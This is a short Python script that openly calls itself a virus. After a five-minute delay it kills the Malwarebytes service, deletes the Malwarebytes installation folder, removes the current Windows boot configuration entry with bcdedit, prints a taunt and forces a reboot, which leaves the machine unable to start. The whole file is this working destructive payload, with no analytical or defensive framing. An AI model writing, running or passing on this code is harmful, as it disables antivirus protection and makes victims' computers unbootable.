import time
import os
print("I warned you! wait 5 minutes now")
time.sleep(300)
os.system("taskkill /f /im MBAMService.exe")
os.system("del /s /q /f C:\Program Files\Malwarebytes")
os.system("bcdedit /delete {current}")
print("You opened a virus ): Your BCD is now gone")
os.system("shutdown -r -t 1")
